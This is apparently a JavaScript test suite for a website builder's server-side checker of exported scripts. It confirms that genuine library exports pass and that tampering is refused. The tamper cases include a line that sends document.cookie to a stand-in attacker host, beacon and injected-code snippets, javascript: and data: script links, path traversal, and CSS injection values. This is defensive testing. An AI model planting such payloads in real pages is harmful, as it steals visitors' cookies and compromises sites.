/** The server's check of published scripts (functions/lib/script-check.js): every real export passes, and every kind of tampering is refused.
    Real exports are made in Node with the same generator the builder uses, from the library's own files. */
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const Asm = require('../scripts/assembler.js');
const { createScriptChecker, LANG_WIRE } = require('../functions/lib/script-check.js');

const FEATURES = path.join(__dirname, '..', 'features');
const slugs = fs.readdirSync(FEATURES).filter((d) => fs.existsSync(path.join(FEATURES, d, 'index.html')));
const read = (slug, file) => { try { return fs.readFileSync(path.join(FEATURES, slug, file), 'utf8'); } catch (e) { return ''; } };
const featuresData = Object.fromEntries(slugs.map((s) => [s, { name: s, html: read(s, 'index.html'), css: read(s, 'style.css'), js: read(s, 'script.js') }]));
const library = async (slug) => (featuresData[slug] && featuresData[slug].js ? featuresData[slug].js : null);
const exportAssets = async () => Object.fromEntries(slugs.map((sl) => { try { return [sl, JSON.parse(read(sl, 'meta.json')).exportAssets || []]; } catch (e) { return [sl, []]; } }).filter(([, l]) => l.length));
const checker = createScriptChecker({ library, exportAssets });
const make = (sections, options) => Asm.generateExportBundle(sections, 'midnight-dark', featuresData, Object.assign({ page: { title: 'T', lang: 'en' } }, options || {}))['script.js'];
const sec = (slug, i, extra) => Object.assign({ slug, id: 'sec-mvve0mu2-' + i + '-14es' }, extra || {});
const ok = async (text, label) => { const r = await checker.check(text); assert(r.ok, (label || 'should pass') + ': ' + r.problem); };
const refused = async (text, label, fragment) => { const r = await checker.check(text); assert(!r.ok, label + ' should be refused'); if (fragment) assert(r.problem.includes(fragment), label + ': wrong reason: ' + r.problem); return r.problem; };
let count = 0;
const test = async (name, fn) => { await fn(); count++; };

(async () => {
  assert(slugs.length > 200, 'the library is there: ' + slugs.length);

  await test('every block of the library, exported alone, passes', async () => {
    let n = 0, withScript = 0;
    for (const slug of slugs) { const text = make([sec(slug, 1)]); await ok(text, slug); n++; if (featuresData[slug].js.trim()) withScript++; }
    assert(n === slugs.length && withScript > 100, `${n} blocks, ${withScript} with their own script`);
  });

  await test('real pages with many blocks, lazy blocks, the dark/light and language buttons, form delivery and content overrides pass', async () => {
    const six = ['responsive-burger-menu', 'oklch-ambient-glow-hero', 'cylindrical-3d-carousel', 'pricing-table-switch', 'contact-form-validated', 'beam-wordmark-footer'];
    await ok(make(six.map((s, i) => sec(s, i + 1))), 'six blocks');
    await ok(make(slugs.slice(0, 60).map((s, i) => sec(s, i + 1))), '60 blocks');
    await ok(make(slugs.map((s, i) => sec(s, i + 1))), 'the whole library on one page');
    const lazyMap = Object.fromEntries(slugs.map((s) => [s, true]));
    await ok(make(six.map((s, i) => sec(s, i + 1)), { lazyMap }), 'every block lazy');
    await ok(make(six.map((s, i) => sec(s, i + 1)), { lazyMap: { 'cylindrical-3d-carousel': true } }), 'one lazy block among others');
    await ok(make(six.map((s, i) => sec(s, i + 1)), { langSwitch: true }), 'with the language button');
    const withForm = make(six.map((s, i) => sec(s, i + 1)), { page: { title: 'T', lang: 'en', formMethod: 'formsubmit', formTarget: 'someone@example.com' } });
    assert(/Form messages: sends the form/.test(withForm), 'the form delivery tail is in this export');
    await ok(withForm, 'with form delivery');
    const withOverrides = make([sec('about-story', 1, { overrides: { h: { selector: 'h1', value: 'Hello "world" </script>', type: 'text' }, l: { selector: 'a', value: 'https://example.com/', type: 'link' }, c: { selector: 'h1', value: '#ff0000', type: 'color', attr: 'color' } } })]);
    assert(/"selector": "h1"/.test(withOverrides), 'overrides are in the export');
    await ok(withOverrides, 'with content overrides, including quotes and a closing script tag');
    await ok(withOverrides + LANG_WIRE, 'with the language-switcher wiring appended (extra pages)');
    await ok(make([sec('about-story', 1), sec('about-story', 2)]), 'the same block twice with different ids');
  });

  await test('the bundler\'s rewrites of file addresses are allowed, and only those', async () => {
    const bundle = (text, pick) => { // what scripts/builder/export-assets.js does to script.js: addresses found in it become relative, only for files that were fetched (pick)
      const map = {}; Asm.findLocalAssetUrls(text).filter(pick).forEach((u) => { let d = u; try { d = decodeURIComponent(u); } catch (e) { /* as is */ } map[u] = d.startsWith('/assets/') ? d.slice(1) : 'assets' + d; });
      let out = Asm.rewriteLocalAssetUrls(text, map);
      return { out, map };
    };
    const carousel = make([sec('cylindrical-3d-carousel', 1)]);
    const urls = Asm.findLocalAssetUrls(carousel);
    assert(urls.length > 0 && urls.some((u) => u.startsWith('/assets/library/')), 'this block names library pictures: ' + urls.slice(0, 2));
    await ok(carousel, 'as generated');
    const all = bundle(carousel, () => true); assert.notStrictEqual(all.out, carousel);
    await ok(all.out, 'every address rewritten, as the bundler does');
    const some = bundle(carousel, (u, i) => i % 2 === 0); await ok(some.out, 'only some addresses rewritten (the others were not found)');
    const target = Object.values(all.map)[0];
    await refused(all.out.replace(target, 'https://evil.example/a.svg'), 'an address sent to another website');
    await refused(all.out.replace(target, target.replace('assets/', 'assets/../../')), 'an address climbing out');
    await refused(all.out.replace(target, '/' + target + '?x=1'), 'an address with an addition');
    await refused(all.out.replace(target, target + 'x'), 'a changed file name');
    // the folders of run-time files (meta.json exportAssets): a string literal that starts with the folder is rewritten the same way
    const forma = make([sec('forma-liquid-particle-studio', 1)]);
    const meta = await exportAssets(); const dir = meta['forma-liquid-particle-studio'][0].slice(0, meta['forma-liquid-particle-studio'][0].lastIndexOf('/') + 1);
    assert(forma.includes(dir), 'the block builds paths from its folder: ' + dir);
    const esc = dir.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const dirsRewritten = forma.replace(new RegExp('(["\'`])' + esc + '(?=[A-Za-z0-9_.\\-]*(?:["\'`]|\\$\\{))', 'g'), (m, q) => q + 'assets' + dir);
    assert.notStrictEqual(dirsRewritten, forma, 'the folder rewrite changes this block');
    await ok(dirsRewritten, 'run-time folder rewritten as the bundler does');
    await ok(bundle(dirsRewritten, () => true).out, 'both kinds of rewrite together');
    await refused(dirsRewritten.replace('assets' + dir, 'https://evil.example' + dir), 'a run-time folder sent to another website');
    const noFolders = createScriptChecker({ library, exportAssets: async () => ({}) });
    assert(!(await noFolders.check(dirsRewritten)).ok, 'without the folder list that rewrite is not recognised (the list matters)');
  });

  await test('a page with no section scripts at all passes (only the fixed parts)', async () => { await ok(make([]), 'empty page'); });

  await test('one changed character anywhere is refused', async () => {
    const text = make(['responsive-burger-menu', 'contact-form-validated'].map((s, i) => sec(s, i + 1)));
    for (const at of [10, 200, Math.floor(text.length / 3), Math.floor(text.length / 2), text.length - 50]) {
      const t = text.slice(0, at) + (text[at] === 'x' ? 'y' : 'x') + text.slice(at + 1);
      assert(!(await checker.check(t)).ok, 'a change at ' + at + ' must be refused');
    }
  });

  await test('added, removed or reordered code is refused', async () => {
    const text = make(['contact-form-validated', 'pricing-table-switch'].map((s, i) => sec(s, i + 1)));
    await refused(text + '\nfetch("https://evil.example/?"+document.cookie);', 'code appended');
    await refused('fetch("https://evil.example");\n' + text, 'code prepended');
    await refused(text.replace('document.addEventListener("DOMContentLoaded", function () {', 'document.addEventListener("DOMContentLoaded", function () {\n  fetch("https://evil.example");'), 'code inside the main function');
    await refused(text.replace('window.__activeSectionRegisteringId = null;\n  }', 'window.__activeSectionRegisteringId = null;\n    new Image().src="https://evil.example";\n  }'), 'code inside a block tail');
    await refused(text.replace(/\n\n  \/\/ Section: pricing-table-switch/, '\n  // Section: pricing-table-switch'), 'a missing separator');
    await refused(text + text, 'the file twice');
    await refused('', 'an empty file'); await refused('alert(1)', 'a one-line file');
    await refused(text.replace('  // Section: contact-form-validated', '  // Section: ' + 'x'.repeat(90)), 'a very long block name');
  });

  await test('a block that is not in the library, a changed id, a swapped block name are refused', async () => {
    const text = make([sec('about-story', 1)]);
    await refused(text.replace(/\/\/ Section: about-story/, '// Section: not-a-real-block').replace(/Error executing ' \+ "about-story"/, 'Error executing \' + "not-a-real-block"'), 'an unknown block', 'not in the library');
    await refused(text.split('"sec-mvve0mu2-1-14es"').join('"sec-1\\"); evil(); (\\""'), 'an id with code in it', 'no valid id');
    await refused(text.split('"sec-mvve0mu2-1-14es"').join('"bad id"'), 'an id with a space', 'no valid id');
    const real = make([sec('contact-form-validated', 1)]);
    await refused(real.replace(/\/\/ Section: contact-form-validated/, '// Section: pricing-table-switch'), 'a block name swapped for another block', 'not the library');
    const noLib = createScriptChecker({ library: async () => null });
    await refused2(noLib, text, 'a library without the block');
    async function refused2(c, t, label) { const r = await c.check(t); assert(!r.ok, label + ' should be refused'); }
  });

  await test('the content-override data is checked as data: shape, kinds, script addresses, size', async () => {
    const plain = make([sec('about-story', 1)]);
    assert(plain.includes('window.__setOverrides([]);'), 'the starting point has an empty list of overrides');
    const base = (list) => plain.replace('window.__setOverrides([]);', () => 'window.__setOverrides(' + JSON.stringify(list, null, 2) + ');');
    const entry = (over) => Object.assign({ section: 'sec-1', field: 'f', selector: 'h1', type: 'text', attr: '', value: 'hi' }, over || {});
    await ok(base([entry()]), 'a plain override');
    await ok(base([]), 'no overrides');
    await refused(base([entry({ type: 'link', value: 'javascript:alert(1)' })]), 'a script link');
    await refused(base([entry({ type: 'link', value: ' JaVa\tScRiPt:alert(1)' })]), 'a disguised script link');
    await refused(base([entry({ type: 'image', value: 'data:text/html,<script>1</script>' })]), 'a script picture');
    await refused(base([entry({ type: 'eval' })]), 'an unknown kind');
    await refused(base([entry({ extra: 'x' })]), 'an extra field');
    await refused(base([{ section: 'sec-1', field: 'f', selector: 'h1', type: 'text', attr: '' }]), 'a missing field');
    await refused(base([entry({ value: 5 })]), 'a number as a value');
    await refused(base([entry({ section: 'sec 1;alert(1)' })]), 'bad section id');
    await refused(base([entry({ type: 'color', attr: 'color;background:url(x)' })]), 'bad style name');
    await refused(base([entry({ value: 'x'.repeat(20001) })]), 'a huge value');
    await refused(base({ a: 1 }), 'an object instead of a list');
    await refused(plain.replace('window.__setOverrides([]);', 'window.__setOverrides([]);alert(1);'), 'code after the data');
    await refused(plain.replace('window.__setOverrides([]);', 'window.__setOverrides([]); window.__setOverrides([]);'), 'the call twice');
  });

  console.log(`✓ script check: ${count} groups, ${slugs.length} real exports pass, tampering refused`);
})().catch((e) => { console.error(e); process.exit(1); });
